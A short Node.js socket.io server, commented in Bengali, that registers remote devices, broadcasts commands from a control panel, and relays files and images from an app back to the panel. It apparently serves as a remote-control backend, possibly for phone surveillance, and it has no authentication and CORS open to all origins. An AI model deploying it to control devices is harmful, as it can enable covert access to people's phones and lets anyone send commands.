const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const cors = require('cors');

const app = express();
app.use(cors());
const server = http.createServer(app);

// Render এর জন্য মেমোরি লিমিট সেট করা হয়েছে
const io = new Server(server, { 
    cors: { origin: "*" },
    maxHttpBufferSize: 1e7 
});

const PORT = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({ limit: '10mb' }));

let devices = {}; 

io.on('connection', (socket) => {
    console.log('Connected:', socket.id);

    // অ্যাপ থেকে ডাটা গ্রহণ
    socket.on('update_list', (data) => {
        const { deviceId, info } = data;
        if (deviceId) {
            devices[deviceId] = { socketId: socket.id, info, lastSeen: new Date().toLocaleTimeString() };
            io.emit('device_online', { deviceId, info, lastSeen: devices[deviceId].lastSeen });
        }
    });

    // প্যানেল থেকে কমান্ড পাঠানো
    socket.on('send_cmd', (data) => {
        io.emit('receive_cmd', data); 
    });

    // অ্যাপ থেকে আসা ফাইল/ইমেজ প্যানেলে পাঠানো
    socket.on('new_incoming_data', (data) => {
        io.emit('new_incoming_data', data);
    });
});

server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
